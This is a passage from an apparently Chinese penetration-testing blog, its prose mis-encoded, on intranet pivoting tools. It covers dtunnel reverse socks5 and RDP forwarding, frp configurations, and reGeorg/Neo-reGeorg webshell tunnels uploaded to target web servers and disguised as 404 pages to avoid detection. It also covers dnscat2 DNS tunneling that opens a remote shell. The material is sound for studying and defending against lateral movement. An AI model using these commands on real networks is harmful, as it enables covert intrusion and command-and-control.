<p>è¿æ¥åˆ°æœåŠ¡ç«¯1.2.3.4:1234ï¼ŒæŒ‡å®šsocks5ä»£ç†ï¼Œé€šé“è¿é€šæ—¶å€™ç›‘å¬ç«¯å£,è¿™é‡Œä½¿ç”¨äº†-r(ä¹Ÿå³æ˜¯åå‘ä»£ç†ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å¼€æ”¾8899ç«¯å£ä½œä¸ºsocks5ä»£ç†ã€‚)</p>
</blockquote>
<p>è¿™é‡Œæ˜¯åªè¦ä½¿ç”¨socks5ä»£ç†å³å¯è¿é€šå†…ç½‘ï¼š<code>socks5 : 1.2.3.4:8899</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\client.exe  -service 1.2.3.4:1234 -v -action socks5  -xor ddd -local :8899 -pipe 5 -session_timeout 30 -auth ccc -r</span><br></pre></td></tr></table></figure>

<ul>
<li>ç«¯å£è½¬å‘(ç»å¸¸ç”¨åœ¨ä¸å‡ºç½‘çš„æ•°æ®åº“ç­‰ã€‚ã€‚)</li>
</ul>
<p>æœåŠ¡ç«¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dtunnel_lite -service 1.2.3.4.106:1234 -xor ddd -v -auth ccc</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯ï¼š</p>
<blockquote>
<p>åˆ©ç”¨åå‘ä»£ç†ï¼Œå°†å†…ç½‘ä¸»æœºçš„80ç«¯å£æ˜ å°„åˆ°å…¬ç½‘ä¸»æœºçš„9999ç«¯å£</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\client.exe  -service 1.2.3.4:1234  -v -action 127.0.0.1:3389 -encrypt -xor ddd -local :9999 -pipe 5 -r -auth ccc -encrypt</span><br></pre></td></tr></table></figure>

<h3 id="Fpr"><a href="#Fpr" class="headerlink" title="Fpr"></a>Fpr</h3><p>åªä»‹ç»å¸¸ç”¨çš„ã€‚</p>
<h4 id="æœ¬åœ°ç¼–è¯‘"><a href="#æœ¬åœ°ç¼–è¯‘" class="headerlink" title="æœ¬åœ°ç¼–è¯‘"></a>æœ¬åœ°ç¼–è¯‘</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆéœ€è¦Goç¯å¢ƒ</span></span><br><span class="line"><span class="comment"># git clone https://github.com/fatedier/frp.git</span></span><br><span class="line">go get github.com/fatedier/frp</span><br><span class="line">make -f Makefile.cross-compiles </span><br><span class="line"><span class="comment"># ç¼–è¯‘å¥½çš„æ–‡ä»¶åœ¨ frpæ ¹ç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure>

<h4 id="å®˜æ–¹æˆå“"><a href="#å®˜æ–¹æˆå“" class="headerlink" title="å®˜æ–¹æˆå“"></a>å®˜æ–¹æˆå“</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://github.com/fatedier/frp/releases</span><br><span class="line"><span class="comment"># å®˜æ–¹ç¼–è¯‘å¥½çš„ï¼Œç›´æ¥å¯ç”¨</span></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨æ–¹å¼-1"><a href="#ä½¿ç”¨æ–¹å¼-1" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h4><p><strong>æœåŠ¡ç«¯ï¼š</strong></p>
<blockquote>
<p>./frps -c frps.ini</p>
</blockquote>
<p><strong>æœåŠ¡ç«¯é€šç”¨å†™æ³•ï¼š</strong></p>
<p>ä¸€èˆ¬ä¸åšdashboardç”¨æ³•ï¼Œåœ¨å†…ç½‘ä»£ç†/è½¬å‘æ—¶å€™ã€‚</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [common] is integral section</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># A literal address or host name for IPv6 must be enclosed</span></span><br><span class="line"><span class="comment"># in square brackets, as in &quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; or &quot;[ipv6-host%zone]:80&quot;</span></span><br><span class="line"><span class="comment"># æœåŠ¡ç«¯é»˜è®¤ç›‘å¬çš„åœ°å€åŠç«¯å£</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># udp port to help make udp hole to penetrate nat</span></span><br><span class="line"><span class="attr">bind_udp_port</span> = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># udp port used for kcp protocol, it can be same with &#x27;bind_port&#x27;</span></span><br><span class="line"><span class="comment"># if not set, kcp is disabled in frps</span></span><br><span class="line"><span class="comment"># ä½œç”¨å’Œbind_portä¸€æ ·</span></span><br><span class="line"><span class="attr">kcp_bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># auth token</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯è§†åŒ–ç•Œé¢(frp Webç•Œé¢)</span></span><br><span class="line"><span class="comment"># set dashboard_addr and dashboard_port to view dashboard of frps</span></span><br><span class="line"><span class="comment"># dashboard_addr&#x27;s default value is same with bind_addr</span></span><br><span class="line"><span class="comment"># dashboard is available only if dashboard_port is set</span></span><br><span class="line"><span class="attr">dashboard_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># dashboard user and passwd for basic auth protect, if not set, both default value is admin</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin</span><br></pre></td></tr></table></figure>

<blockquote>
<p>./frpc -c frpc.ini</p>
</blockquote>
<p><strong>å®¢æˆ·ç«¯é€šç”¨å†™æ³•ï¼š</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># for authentication</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"><span class="comment"># set admin address for control frpc&#x27;s action by http api such as reload</span></span><br><span class="line"><span class="attr">admin_addr</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">7400</span></span><br><span class="line"><span class="attr">admin_user</span> = admin</span><br><span class="line"><span class="attr">admin_pwd</span> = admin</span><br><span class="line"></span><br><span class="line"><span class="section">[ssh_random]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># if remote_port is 0, frps will assign a random port for you</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h4 id="SSHè½¬å‘"><a href="#SSHè½¬å‘" class="headerlink" title="SSHè½¬å‘"></a>SSHè½¬å‘</h4><ul>
<li>ç¬¬ä¸€ç§æ–¹å¼ï¼šå°†ç›®æ ‡æœºçš„SSHç«¯å£è½¬å‘åˆ°æŒ‡å®š/éšæœºç«¯å£</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh_random]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># if remote_port is 0, frps will assign a random port for you</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬äºŒç§ï¼šè®¾ç½®å„ç§å‚æ•°(ä¼ è¾“åŠ å¯†ã€æ•°æ®å‹ç¼©ã€è¶…æ—¶æ—¶é—´ç­‰)</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="comment"># tcp | udp | http | https | stcp | xtcp, default is tcp(å¯ç”¨çš„åè®®)</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># limit bandwith for this proxy, unit is KB and MB(è®¾ç½®æ­¤ä»£ç†çš„å¸¦å®½)</span></span><br><span class="line"><span class="attr">bandwith_limit</span> = <span class="number">1</span>MB</span><br><span class="line"><span class="comment"># true or false, if true, messages between frps and frpc will be encrypted, default is false(è®¾ç½®ä¼ è¾“åŠ å¯†ï¼Œé»˜è®¤ä¸åŠ å¯†)</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># if true, message will be compressed(ä¼ è¾“æ•°æ®å‹ç¼©)</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># remote port listen by frps(è½¬å‘åˆ°çš„ç«¯å£ï¼Œå³client ssh:22----&gt; Server:6001)</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6001</span></span><br><span class="line"><span class="comment"># frps will load balancing connections for proxies in same group</span></span><br><span class="line"><span class="attr">group</span> = test_group</span><br><span class="line"><span class="comment"># group should have same group key</span></span><br><span class="line"><span class="attr">group_key</span> = <span class="number">123456</span></span><br><span class="line"><span class="comment"># enable health check for the backend service, it support &#x27;tcp&#x27; and &#x27;http&#x27; now</span></span><br><span class="line"><span class="comment"># frpc will connect local service&#x27;s port to detect it&#x27;s healthy status</span></span><br><span class="line"><span class="attr">health_check_type</span> = tcp</span><br><span class="line"><span class="comment"># health check connection timeout(è¶…æ—¶æ—¶é—´)</span></span><br><span class="line"><span class="attr">health_check_timeout_s</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># if continuous failed in 3 times, the proxy will be removed from frps(æœ€å¤§é”™è¯¯æ¬¡æ•°ï¼Œè¶…è¿‡åˆ™åˆ é™¤ä»£ç†)</span></span><br><span class="line"><span class="attr">health_check_max_failed</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># every 10 seconds will do a health check(æ£€æµ‹ä»£ç†çš„æ—¶é—´é—´éš”)</span></span><br><span class="line"><span class="attr">health_check_interval_s</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure>

<h4 id="HTTP-Socks5ä»£ç†"><a href="#HTTP-Socks5ä»£ç†" class="headerlink" title="HTTP/Socks5ä»£ç†"></a>HTTP/Socks5ä»£ç†</h4><p>å°†éœ€è¦é€šè¿‡è¿™ä¸ªä»£ç†è®¿é—®å¤–ç½‘çš„å†…éƒ¨æœºå™¨çš„ä»£ç†åœ°å€è®¾ç½®ä¸º192.168.90.231:6000ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ FRP å®¢æˆ·ç«¯æœºå™¨çš„ç½‘ç»œè®¿é—®äº’è”ç½‘äº†ã€‚<br> http_proxy æ’ä»¶ä¹Ÿæ”¯æŒè®¤è¯æœºåˆ¶ï¼Œå¦‚æœéœ€è¦å¯ç”¨è®¤è¯å¯é€šè¿‡é…ç½®å‚æ•° plugin_http_user å’Œ plugin_http_passwd å¯ç”¨ã€‚<br> å¦‚éœ€å¯ç”¨ Socks5 ä»£ç†ï¼Œåªéœ€å°† plugin çš„å€¼æ›´æ¢ä¸º socks5 å³å¯ã€‚</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">plugin</span> = http_proxy</span><br><span class="line"><span class="comment"># è®¾ç½®è´¦å·å¯†ç </span></span><br><span class="line"><span class="comment"># plugin_http_user = abc</span></span><br><span class="line"><span class="comment"># plugin_http_passwd = abc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin = socks5</span></span><br><span class="line"><span class="comment"># plugin_user = abc</span></span><br><span class="line"><span class="comment"># plugin_passwd = abc</span></span><br></pre></td></tr></table></figure>

<h4 id="TCP-UDPç«¯å£è½¬å‘"><a href="#TCP-UDPç«¯å£è½¬å‘" class="headerlink" title="TCP/UDPç«¯å£è½¬å‘"></a>TCP/UDPç«¯å£è½¬å‘</h4><ul>
<li>TCPåè®®è¿›è¡Œç«¯å£è½¬å‘ï¼Œå¤šç«¯å£éœ€è¦ï¼Œlocal_portå’Œremote_portä¸ªæ•°è¿›è¡Œå¯¹åº”ã€‚</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[range:tcp_port]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span>,<span class="number">88</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8000</span>,<span class="number">8888</span></span><br></pre></td></tr></table></figure>

<ul>
<li>UDP</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[range:udp_port]</span></span><br><span class="line"><span class="attr">type</span> = udp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">6010</span>-<span class="number">6020</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6010</span>-<span class="number">6020</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>reGeorg æ˜¯ reDuh çš„å‡çº§ç‰ˆï¼Œä¸»è¦æ˜¯æŠŠå†…ç½‘æœåŠ¡å™¨çš„ç«¯å£é€šè¿‡ http/https  éš§é“è½¬å‘åˆ°æœ¬æœºï¼Œå½¢æˆä¸€ä¸ªå›è·¯ã€‚ç”¨äºç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘æˆ–åšäº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨å†…éƒ¨å¼€æ”¾ç«¯å£ã€‚å®ƒåˆ©ç”¨ webshell å»ºç«‹ä¸€ä¸ª  socks ä»£ç†è¿›è¡Œå†…ç½‘ç©¿é€ï¼ŒæœåŠ¡å™¨å¿…é¡»æ”¯æŒ aspxã€php æˆ– jsp è¿™äº› web ç¨‹åºä¸­çš„ä¸€ç§ã€‚</p>
<ul>
<li>é¦–å…ˆä¸Šä¼ tunnel.jspåˆ°WebæœåŠ¡å™¨,æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ï¼Œç¡®è®¤æ­£å¸¸è§£æã€‚ç„¶åæœ¬åœ°è¿è¡Œã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://Weåœ°å€/tunnel.jsp -p <span class="number">9999</span>	</span><br></pre></td></tr></table></figure>

<p>é…ç½®proxyChainsæˆ–è€…å…¶ä»–ä»£ç†å·¥å…·ã€‚</p>
<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0wtY29kZXMvTmVvLXJlR2Vvcmc=">https://github.com/L-codes/Neo-reGeorg<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><strong>Neo-reGeorg</strong> æ˜¯ä¸€ä¸ªæ—¨åœ¨ç§¯æé‡æ„ <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorg<i class="fa fa-external-link-alt"></i></span> çš„é¡¹ç›®ï¼Œç›®çš„æ˜¯ï¼š</p>
<ul>
<li>æé«˜ tunnel è¿æ¥å®‰å…¨æ€§</li>
<li>æé«˜å¯ç”¨æ€§ï¼Œé¿å…ç‰¹å¾æ£€æµ‹</li>
<li>æé«˜ä¼ è¾“å†…å®¹ä¿å¯†æ€§</li>
<li>è§£å†³ reGeorg ç°å­˜åœ¨çš„é—®é¢˜ï¼Œä¿®å¤éƒ¨åˆ†å°BUG</li>
</ul>
<p><strong>æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> Ï€ Neo-reGeorg master â¯ python3 neoreg.py generate -h</span><br><span class="line">usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [--read-buff Bytes]</span><br><span class="line"></span><br><span class="line">Generate neoreg webshell</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -k KEY, --key KEY     Specify connection key.</span><br><span class="line">  -o DIR, --outdir DIR  Output directory.</span><br><span class="line">  -f FILE, --file FILE  Camouflage html page file</span><br><span class="line">  --read-buff Bytes     Remote <span class="built_in">read</span> buffer.(default: 513)</span><br><span class="line">  </span><br><span class="line"> Ï€ Neo-reGeorg master â¯ python3 neoreg.py  -h</span><br><span class="line">usage: neoreg.py [-h] -u URI -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE]</span><br><span class="line">                 [-x LINE] [--read-buff Bytes] [--read-interval MS]</span><br><span class="line">                 [--max-threads N] [-v]</span><br><span class="line"></span><br><span class="line">Socks server <span class="keyword">for</span> Neoreg HTTP(s) tunneller. DEBUG MODE: -k</span><br><span class="line">(debug_all|debug_base64|debug_headers_key|debug_headers_values)</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -u URI, --url URI     The url containing the tunnel script</span><br><span class="line">  -k KEY, --key KEY     Specify connection key</span><br><span class="line">  -l IP, --listen-on IP</span><br><span class="line">                        The default listening address.(default: 127.0.0.1)</span><br><span class="line">  -p PORT, --listen-port PORT</span><br><span class="line">                        The default listening port.(default: 1080)</span><br><span class="line">  -s, --skip            Skip usability testing</span><br><span class="line">  -H LINE, --header LINE</span><br><span class="line">                        Pass custom header LINE to server</span><br><span class="line">  -c LINE, --cookie LINE</span><br><span class="line">                        Custom init cookies</span><br><span class="line">  -x LINE, --proxy LINE</span><br><span class="line">                        proto://host[:port] Use proxy on given port</span><br><span class="line">  --read-buff Bytes     Local <span class="built_in">read</span> buffer, max data to be sent per</span><br><span class="line">                        POST.(default: 2048 max: 2600)</span><br><span class="line">  --read-interval MS    Read data interval <span class="keyword">in</span> milliseconds.(default: 100)</span><br><span class="line">  --max-threads N       Proxy max threads.(default: 1000)</span><br><span class="line">  -v                    Increase verbosity level (use -vv or more <span class="keyword">for</span> greater</span><br><span class="line">                        effect)</span><br></pre></td></tr></table></figure>

<p>#####æ™®é€šç”¨æ³• </p>
<p>æœåŠ¡ç«¯ï¼šé¦–å…ˆéœ€è¦è®¾ç½®å¯†ç ç”Ÿæˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">    [+] Create neoreg server files:</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.js</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.php</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 neoreg.py -k password -u http:&#x2F;&#x2F;xx&#x2F;tunnel.php</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">  Log Level set to [ERROR]</span><br><span class="line">  Starting socks server [127.0.0.1:1080], tunnel at [http:&#x2F;&#x2F;k&#x2F;tunnel.php]</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h4 id="é«˜çº§ç”¨æ³•"><a href="#é«˜çº§ç”¨æ³•" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h4><ul>
<li>æ”¯æŒç”Ÿæˆçš„æœåŠ¡ç«¯ï¼Œåœ¨GETè¯·æ±‚æ—¶å“åº”é¡µé¢å†…å®¹ ä¼ªè£…æˆ404ç­‰é¡µé¢  è‡ªå·±æ„é€ 404é¡µé¢å†…å®¹ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æœåŠ¡ç«¯ï¼š</span><br><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br><span class="line"></span><br><span class="line">å®¢æˆ·ç«¯</span><br><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip</span><br></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœæœåŠ¡ç«¯ï¼ˆå³æ˜¯ä½ ä¼ çš„æ–‡ä»¶ï¼‰éœ€è¦è®¾ç½®ä»£ç†æ‰èƒ½è®¿é—®ã€‚å¯ä»¥ä½¿ç”¨å‚æ•°<code>--proxy</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080</span><br></pre></td></tr></table></figure>

<ul>
<li>å¦‚éœ€Authorizationè®¤è¯å’Œå®šåˆ¶çš„Headeræˆ–Cookie</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pytohn neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H &#39;Authorization: cm9vdDppcyB0d2VsdmU&#x3D;&#39; --cookie &quot;key&#x3D;value;key2&#x3D;value2&quot;</span><br></pre></td></tr></table></figure>

<h3 id="DNScat"><a href="#DNScat" class="headerlink" title="DNScat"></a>DNScat</h3><p>ä¸æƒ³è‡ªå·±ç¼–è¯‘å¯ç›´æ¥ä¸‹è½½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;downloads.skullsecurity.org&#x2F;dnscat2&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="Linuxç¼–è¯‘-1"><a href="#Linuxç¼–è¯‘-1" class="headerlink" title="Linuxç¼–è¯‘"></a>Linuxç¼–è¯‘</h4><p>å…¶DNSé€šä¿¡åŸºäºdnscatï¼Œå› æ­¤å…¶æœåŠ¡ç«¯éœ€è¦dnscatã€‚å¦‚æœå®åœ¨ä¸èƒ½å®‰è£…ï¼Œå‚è€ƒå®˜ç½‘ã€‚ã€‚ã€‚</p>
<p>è¿™é‡Œä»…ä»…æ˜¯Debian10_x64 Linuxã€‚æˆ‘å®¢æˆ·ç«¯makeæ—¶å€™æŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“ã€‚ã€‚ã€‚å¯ä»¥./dnscatæµ‹è¯•ä¸€ä¸‹æ˜¯å¦æ­£å¸¸ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡ç«¯</span></span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯</span></span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<ul>
<li>é…ç½®æœåŠ¡ç«¯ï¼Œå»ºè®®ä½¿ç”¨è‡ªå·±é…ç½®çš„DNSã€‚é…ç½®A,NS è§£æ</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡ç«¯</span></span><br><span class="line">ruby ./dnscat2.rb vps.example.com -e open -c example.com --no-cache</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœåŠ¡ç«¯ç›´è¿æ¨¡å¼</span></span><br><span class="line">ruby ./dnscat2.rb --dns server=127.0.0.1,port=533,<span class="built_in">type</span>=TXT --secret=example.com</span><br><span class="line"><span class="comment"># -c å®šä¹‰äº†&#x27;pre-shared secret&#x27;,å¯ä»¥ä½¿ç”¨å…·æœ‰é¢„å…±äº«å¯†é’¥çš„èº«ä»½éªŒè¯æœºåˆ¶æ¥é˜²æ­¢ä¸­é—´äººæ”»å‡»ï¼Œå¦‚æœæœªå®šä¹‰è¯¥å‚æ•°ï¼Œåˆ™ä¼šè‡ªåŠ¨ç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œå®¢æˆ·ç«¯éœ€è¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e è§„å®šçš„å®‰å…¨çº§åˆ«  open è¡¨ç¤ºæœåŠ¡ç«¯å…è®¸å®¢æˆ·ç«¯ä¸è¿›è¡ŒåŠ å¯†</span></span><br><span class="line"><span class="comment"># --no-cache ç¦æ­¢ç¼“å­˜ï¼Œå»ºè®®æ·»åŠ ï¼špowershell-dnscat2å®¢æˆ·ç«¯ä¸dnscat2æœåŠ¡å™¨çš„Cachingæ¨¡å¼ä¸å…¼å®¹ã€‚</span></span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h4><p>æ²¡æœ‰é…ç½®åŸŸåï¼Œå› æ­¤è¯•éªŒç›´è¿ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æœåŠ¡ç«¯  Linux</span></span><br><span class="line">ruby dnscat2.rb -s 553 -c 123</span><br><span class="line"><span class="comment"># å®¢æˆ·ç«¯ Win </span></span><br><span class="line">PS C:\Users\windows10\Desktop&gt; .\dnscat2-v0.07-client-win32.exe --dns server=VPS s,port=553 --secret=123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows	<span class="comment"># æŸ¥çœ‹è¿æ¥</span></span><br><span class="line">window -i 1  <span class="comment"># æŒ‡å®šè¿›å…¥ç¬¬ä¸€ä¸ªè¿æ¥</span></span><br><span class="line">shell. <span class="comment"># å¼€å¯SHELLè¿æ¥ï¼Œä¼šæ–°å»ºä¸€ä¸ªè¿æ¥ï¼Œéœ€è¦window -i 2</span></span><br><span class="line"></span><br><span class="line">å¡å¡å¡å¡å¡å¡å¡å¡å¡å¡å¡å¡å¡</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>Proxy</tag>
        <tag>æ€»ç»“</tag>
        <tag>ä»£ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Githubè¯­æ³•</title>
    <url>/posts/a1b49219/</url>
